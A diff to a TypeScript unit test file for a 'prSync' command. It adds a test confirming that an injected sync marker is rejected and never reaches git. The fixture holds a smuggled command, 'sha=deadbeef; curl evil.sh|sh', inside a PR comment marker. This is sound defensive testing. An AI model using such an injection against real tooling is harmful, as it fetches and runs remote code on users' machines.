@@ -176,6 +176,7 @@ fix description`
 
   describe('prSync command', () => {
     let mockExecSync: any
+    let mockExecFileSync: any
     let output: string
 
     beforeEach(async () => {
@@ -186,12 +187,16 @@ fix description`
       vi.spyOn(console, 'error').mockImplementation((...args) => {
         output += args.join(' ') + '\n'
       })
+      vi.spyOn(console, 'warn').mockImplementation((...args) => {
+        output += args.join(' ') + '\n'
+      })
       vi.spyOn(process, 'exit').mockImplementation((() => {
         throw new Error('process.exit')
       }) as any)
 
       vi.mock('node:child_process', () => ({
         execSync: vi.fn(),
+        execFileSync: vi.fn(),
       }))
 
       vi.mock('node:fs', () => ({
@@ -201,6 +206,7 @@ fix description`
 
       const mod = await import('node:child_process')
       mockExecSync = mod.execSync
+      mockExecFileSync = mod.execFileSync
     })
 
     afterEach(() => {
@@ -216,6 +222,11 @@ fix description`
       if (cmd.includes('git rev-parse HEAD')) return 'currentsha123'
       if (cmd.includes('git merge-base')) return 'basesha123'
       if (cmd.includes('git log')) return '---COMMIT---\nnewsha\nAuthor\na@b.com\n2024-06-01\nfeat: test commit'
+      return ''
+    })
+    mockExecFileSync.mockImplementation((cmd: string, args: string[]) => {
+      if (cmd === 'git' && args[0] === 'merge-base') return 'basesha123'
+      if (cmd === 'git' && args[0] === 'log') return '---COMMIT---\nnewsha\nAuthor\na@b.com\n2024-06-01\nfeat: test commit'
       return ''
     })
 
@@ -234,15 +245,44 @@ fix description`
       if (cmd.includes('gh --version')) return 'gh version 2.47.0'
       if (cmd.includes('gh pr view 202 --json baseRefName')) return 'main'
       if (cmd.includes('gh api repos')) return '<!-- pr-sync: sha=currentsha123 -->'
-      // Range would be currentsha123..HEAD — mock empty result
-      if (cmd.includes('git log')) return ''
       if (cmd.includes('git rev-parse HEAD')) return 'currentsha123'
+      return ''
+    })
+    mockExecFileSync.mockImplementation((cmd: string, args: string[]) => {
+      if (cmd === 'git' && args[0] === 'merge-base') return 'basesha123'
+      if (cmd === 'git' && args[0] === 'log') return ''
       return ''
     })
 
     const { prSync } = await import('../../src/commands/prSync.js')
     await prSync(['--pr', '202', '--dry-run'])
 
+    expect(output).toContain('No new commits since last sync.')
+  })
+
+  it('rejects an injected marker SHA and never passes it to git', async () => {
+    mockExecSync.mockImplementation((cmd: string, _opts?: any) => {
+      if (cmd.includes('gh --version')) return 'gh version 2.47.0'
+      if (cmd.includes('gh pr view 202 --json baseRefName')) return 'main'
+      if (cmd.includes('gh api repos')) return '<!-- pr-sync: sha=deadbeef; curl evil.sh|sh -->'
+      if (cmd.includes('git merge-base')) return 'basesha123'
+      return ''
+    })
+    mockExecFileSync.mockImplementation((cmd: string, args: string[]) => {
+      if (cmd === 'git' && args[0] === 'log') return ''
+      return ''
+    })
+
+    const { prSync } = await import('../../src/commands/prSync.js')
+    await prSync(['--pr', '202', '--dry-run'])
+
+    expect(output).toContain('Malformed sync marker SHA ignored')
+    const allShellCommands = mockExecSync.mock.calls.map((c: string[]) => c[0]).join('\n')
+    const allFileArgs = mockExecFileSync.mock.calls.map((c: string[]) => c[1].join(' ')).join('\n')
+    expect(allShellCommands).not.toContain(';')
+    expect(allShellCommands).not.toContain('curl')
+    expect(allFileArgs).not.toContain(';')
+    expect(allFileArgs).not.toContain('curl')
     expect(output).toContain('No new commits since last sync.')
   })
 
